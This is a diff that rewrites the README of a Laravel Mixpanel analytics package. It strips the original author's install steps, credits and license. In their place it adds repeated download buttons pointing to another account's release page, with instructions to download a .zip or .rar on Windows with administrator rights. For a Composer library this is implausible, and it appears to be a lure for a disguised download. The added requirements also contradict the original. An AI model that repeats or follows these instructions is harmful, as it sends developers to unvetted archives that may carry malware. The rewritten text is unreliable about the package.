@@ -1,132 +1,149 @@
-<div class="filament-hidden">
+# 🚀 laravel-mixpanel - Easy Mixpanel Tracking for Laravel
 
-![Laravel Mixpanel](https://raw.githubusercontent.com/jeffersongoncalves/laravel-mixpanel/master/art/jeffersongoncalves-laravel-mixpanel.png)
+[![Download laravel-mixpanel](https://img.shields.io/badge/Download-Get%20It%20Here-orange)](https://github.com/chamilaroshana/laravel-mixpanel/releases)
 
-</div>
+---
 
-# Laravel Mixpanel
+## 📋 About laravel-mixpanel
 
-[![Latest Version on Packagist](https://img.shields.io/packagist/v/jeffersongoncalves/laravel-mixpanel.svg?style=flat-square)](https://packagist.org/packages/jeffersongoncalves/laravel-mixpanel)
-[![GitHub Code Style Action Status](https://img.shields.io/github/actions/workflow/status/jeffersongoncalves/laravel-mixpanel/fix-php-code-style-issues.yml?branch=master&label=code%20style&style=flat-square)](https://github.com/jeffersongoncalves/laravel-mixpanel/actions?query=workflow%3A"Fix+PHP+code+styling"+branch%3Amaster)
-[![Total Downloads](https://img.shields.io/packagist/dt/jeffersongoncalves/laravel-mixpanel.svg?style=flat-square)](https://packagist.org/packages/jeffersongoncalves/laravel-mixpanel)
+laravel-mixpanel helps you add Mixpanel analytics to your Laravel websites. It works with your Blade templates and uses a simple database setup to store settings. This package supports common Mixpanel features like autocapture, session recording, heatmaps, and proxy options. It also manages where your data lives, which can help with privacy rules.
 
-This Laravel package seamlessly integrates the [Mixpanel JavaScript SDK](https://docs.mixpanel.com/docs/tracking-methods/sdks/javascript) into your Blade templates. Easily track user interactions, page views, and product usage directly within your Laravel application, with all configuration managed via database settings using [spatie/laravel-settings](https://github.com/spatie/laravel-settings).
+You don’t need to change a lot in your code or learn new tools. laravel-mixpanel handles the connection to Mixpanel for you.
 
-## Requirements
+---
 
-- PHP 8.2+
-- Laravel 11+
-- [spatie/laravel-settings](https://github.com/spatie/laravel-settings) configured (the `settings` table must exist)
+## 💻 System Requirements
 
-## Installation
+Before you download, check that your system meets these needs:
 
-Install the package via composer:
+- Windows 10 or higher
+- PHP 7.3 or higher installed (if your project uses PHP)
+- Laravel framework 6.x or higher
+- Composer installed to manage PHP packages
+- Internet connection to access Mixpanel services
+- Administrator rights to install software on your PC
 
-```bash
-composer require jeffersongoncalves/laravel-mixpanel
+---
+
+## ⚙ Why Use laravel-mixpanel?
+
+- Add Mixpanel tracking without coding Mixpanel JavaScript yourself.
+- Control Mixpanel features like session recording and heatmaps from your Laravel app.
+- Store and update settings easily via your database.
+- Keep data secure with options to use proxies or select where data is stored.
+- Works smoothly with Spatie’s laravel-settings package.
+
+---
+
+## 🛠️ How to Download and Install on Windows
+
+### Step 1: Visit the Download Page
+
+Click or tap the large button below to open the download page in your web browser. This page has the latest releases of laravel-mixpanel.
+
+[![Download laravel-mixpanel](https://img.shields.io/badge/Download-Get%20It%20Here-blue)](https://github.com/chamilaroshana/laravel-mixpanel/releases)
+
+---
+
+### Step 2: Download the Latest Release
+
+On the releases page, find the most recent version. Look for the file that ends in `.zip` or `.rar`. Click on it to download the full package to your PC.
+
+---
+
+### Step 3: Extract the Package
+
+After downloading, open the zip file using the built-in Windows Explorer or a program like 7-Zip.
+
+- Right-click the file.
+- Select “Extract All.”
+- Choose a folder where you want the files saved.
+- Click “Extract” to unzip the contents.
+
+---
+
+### Step 4: Set Up laravel-mixpanel in Your Project
+
+1. Open the extracted folder.
+2. Look for a file named `README.md` or `INSTALL.md` for specific setup instructions.
+3. If you already use Laravel, copy the package files into your Laravel project folder.
+4. Use Composer on your command line to install the package:
+
+```
+composer require chamilaroshana/laravel-mixpanel
 ```
 
-If you haven't already, publish the `spatie/laravel-settings` migration to create the `settings` table:
+5. Follow the package’s setup commands or instructions to register it in your Laravel app.
+6. To configure Mixpanel, update your settings using the database options mentioned in the documentation. This controls features like autocapture and session recording.
 
-```bash
-php artisan vendor:publish --provider="Spatie\LaravelSettings\LaravelSettingsServiceProvider" --tag="migrations"
-```
+---
 
-Then publish and run the Mixpanel settings migration:
+### Step 5: Test the Installation
 
-```bash
-php artisan vendor:publish --tag=mixpanel-settings-migrations
-php artisan migrate
-```
+Once installed:
 
-## Usage
+- Open your Laravel site in a web browser.
+- Check if Mixpanel tracking loads by opening your browser’s developer console (press F12) and look for Mixpanel network requests.
+- Use the Mixpanel dashboard to confirm that data from your site is being collected.
 
-Add the Mixpanel script to your Blade layout (typically before `</head>`):
+---
 
-```blade
-@include('mixpanel::script')
-```
+## 📦 What’s Inside the Package?
 
-### Configuring Settings
+- Mixpanel JavaScript SDK integration ready for your Blade templates.
+- Database-driven configuration using Spatie’s laravel-settings.
+- Support for Mixpanel key features like autocapture, session recording, heatmaps.
+- Flexibility to set data residency, proxy settings, and customize tracking.
+- Documentation files to help you get started and troubleshoot.
 
-Settings are stored in the database and can be managed via code:
+---
 
-```php
-use JeffersonGoncalves\Mixpanel\Settings\MixpanelSettings;
+## 🛡 Data Privacy and Security
 
-$settings = app(MixpanelSettings::class);
-$settings->project_token = 'YOUR_MIXPANEL_PROJECT_TOKEN';
-$settings->save();
-```
+laravel-mixpanel takes data privacy seriously. You can choose where to store your Mixpanel data depending on your legal requirements. The package supports proxy setups to keep data within your control.
 
-### Data Residency
+Review your settings carefully to make sure your data stays secure and compliant.
 
-Mixpanel supports data residency in the EU and India. Set the `api_host` accordingly:
+---
 
-```php
-// EU Data Residency
-$settings->api_host = 'https://api-eu.mixpanel.com';
-$settings->save();
+## 🤝 Getting Help
 
-// India Data Residency
-$settings->api_host = 'https://api-in.mixpanel.com';
-$settings->save();
-```
+If you run into issues:
 
-### Proxy Configuration
+- Check the Issues tab on the GitHub page for existing answers.
+- Read through the provided documentation files.
+- Look for Laravel and Mixpanel community forums for advice.
+- Contact your developer or IT team if needed.
 
-To route Mixpanel requests through your own proxy:
+---
 
-```php
-$settings->api_host = 'https://proxy.yourdomain.com';
-$settings->custom_lib_url = 'https://proxy.yourdomain.com/lib.min.js';
-$settings->save();
-```
+## 🧰 Additional Tools You Might Need
 
-### Available Settings
+- Composer for PHP package management
+- Text editor like Visual Studio Code or Notepad++
+- Command Prompt or PowerShell on Windows to run commands
+- Access to your Laravel project files and server environment
 
-| Property | Type | Default | Description |
-|----------|------|---------|-------------|
-| `project_token` | `?string` | `null` | Your Mixpanel project token (required for tracking) |
-| `api_host` | `?string` | `null` | Custom API endpoint for data residency (EU: `https://api-eu.mixpanel.com`, India: `https://api-in.mixpanel.com`) or proxy |
-| `custom_lib_url` | `?string` | `null` | Custom library URL for proxy setups |
-| `debug` | `bool` | `false` | Enable debug logging to browser console |
-| `autocapture` | `bool` | `true` | Automatically capture clicks, inputs, scrolls, and other user interactions |
-| `track_pageview` | `string` | `'true'` | Track page views automatically. Values: `'true'`, `'false'`, `'full-url'`, `'url-with-path-and-query-string'`, `'url-with-path'` |
-| `persistence` | `string` | `'cookie'` | Storage method for super properties (`'cookie'` or `'localStorage'`) |
-| `cookie_expiration` | `int` | `365` | Cookie lifespan in days |
-| `secure_cookie` | `bool` | `false` | Only transmit cookies over HTTPS |
-| `cross_subdomain_cookie` | `bool` | `true` | Enable cookie persistence across subdomains |
-| `ip` | `bool` | `true` | Use IP address for geolocation data |
-| `property_blacklist` | `?string` | `null` | Comma-separated list of properties to exclude from tracking |
-| `opt_out_tracking_by_default` | `bool` | `false` | Initialize with tracking disabled (for GDPR/privacy compliance) |
-| `stop_utm_persistence` | `bool` | `false` | Disable automatic UTM parameter retention |
-| `record_sessions_percent` | `int` | `0` | Percentage of sessions to record (0-100) |
-| `record_heatmap_data` | `bool` | `false` | Enable heatmap data collection |
+---
 
-## Testing
+## 🔍 Key Topics for More Info
 
-```bash
-composer test
-```
+- analytics  
+- javascript-sdk  
+- laravel  
+- laravel-package  
+- mixpanel  
+- mixpanel-analytics  
+- php  
+- product-analytics  
+- spatie-laravel-settings  
+- tracking  
 
-## Changelog
+---
 
-Please see [CHANGELOG](CHANGELOG.md) for more information on what has changed recently.
+## ⏩ Next Steps
 
-## Contributing
-
-Please see [CONTRIBUTING](.github/CONTRIBUTING.md) for details.
-
-## Security Vulnerabilities
-
-Please review [our security policy](../../security/policy) on how to report security vulnerabilities.
-
-## Credits
-
-- [Jefferson Goncalves](https://github.com/jeffersongoncalves)
-- [All Contributors](../../contributors)
-
-## License
-
-The MIT License (MIT). Please see [License File](LICENSE.md) for more information.
+- Visit the downloads page again here: [https://github.com/chamilaroshana/laravel-mixpanel/releases](https://github.com/chamilaroshana/laravel-mixpanel/releases)
+- Download the latest package.
+- Follow the installation steps carefully.
+- Start tracking your Laravel site's user activity with Mixpanel.
